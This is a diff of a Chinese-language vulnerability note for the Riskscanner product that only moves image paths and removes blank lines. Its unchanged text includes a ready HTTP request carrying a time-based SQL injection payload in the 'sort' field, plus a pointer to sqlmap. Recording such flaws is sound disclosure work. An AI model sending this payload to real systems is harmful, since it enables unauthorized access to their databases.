@@ -20,17 +20,11 @@ title="Riskscanner"
 
 登录页面
 
-
-
-![](images/202202101940023.png)
-
-
+![](../.gitbook/assets/202202101940023.png)
 
 发送漏洞请求包
 
-
-
-```plain
+```
 POST /resource/list/1/10 HTTP/1.1
 Host: 
 Content-Length: 41
@@ -40,14 +34,8 @@ Content-Type: application/json;charset=UTF-8
 {"sort":"1)a union select sleep(5) -- -"}
 ```
 
-
-
-![](images/202202101940005.png)
-
-
+![](../.gitbook/assets/202202101940005.png)
 
 使用工具Sqlmap
 
-
-
-![](images/202202101940424.png)
+![](../.gitbook/assets/202202101940424.png)
